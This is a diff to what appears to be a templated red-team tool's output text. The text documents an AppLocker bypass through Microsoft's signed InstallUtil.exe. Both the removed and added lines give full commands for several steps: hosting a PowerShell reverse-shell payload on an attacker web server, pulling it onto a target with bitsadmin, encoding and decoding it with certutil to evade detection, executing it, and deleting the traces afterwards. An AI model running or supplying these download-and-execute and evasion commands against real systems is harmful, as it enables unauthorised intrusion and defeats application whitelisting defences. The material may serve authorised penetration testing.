@@ -62,16 +62,16 @@ output:
 
     Host Payload (run.txt):
     Create run.txt with PowerShell payload (reverse shell, Invoke-PowerShellTcp, etc.)
-    python3 -m http.server 80
+    $ python3 -m http.server 80
 
     Transfer and Execute:
-    python3 -m http.server 8080
-    On target: bitsadmin /Transfer theJob http://YOUR_IP:8080/{{ output_file }} C:\Windows\Tasks\{{ output_file }} && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\{{ output_file }}
+    $ python3 -m http.server 80
+    $ bitsadmin /Transfer theJob http://{{ lhost }}/{{ output_file }} C:\Windows\Tasks\{{ output_file }} && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\{{ output_file }}
 
     Alternative (Encoded for Evasion):
-    certutil -encode {{ output_file }} bypass_encoded.txt
-    python3 -m http.server 8080
-    On target: bitsadmin /Transfer job http://YOUR_IP:8080/bypass_encoded.txt C:\Windows\Tasks\enc.txt && certutil -decode C:\Windows\Tasks\enc.txt C:\Windows\Tasks\bypass.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
+    $ certutil -encode {{ output_file }} bypass_encoded.txt
+    $ python3 -m http.server 80
+    $ bitsadmin /Transfer job http://{{ lhost }}/bypass_encoded.txt C:\Windows\Tasks\enc.txt && certutil -decode C:\Windows\Tasks\enc.txt C:\Windows\Tasks\bypass.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
 
     Notes:
     - InstallUtil.exe is Microsoft-signed and allowed by default AppLocker rules
@@ -93,6 +93,6 @@ output:
 
     Cleanup:
     On target:
-    del C:\Windows\Tasks\{{ output_file }}
-    del C:\Windows\Tasks\bypass.exe
-    del C:\Windows\Tasks\enc.txt
+    $ del C:\Windows\Tasks\{{ output_file }}
+    $ del C:\Windows\Tasks\bypass.exe
+    $ del C:\Windows\Tasks\enc.txt
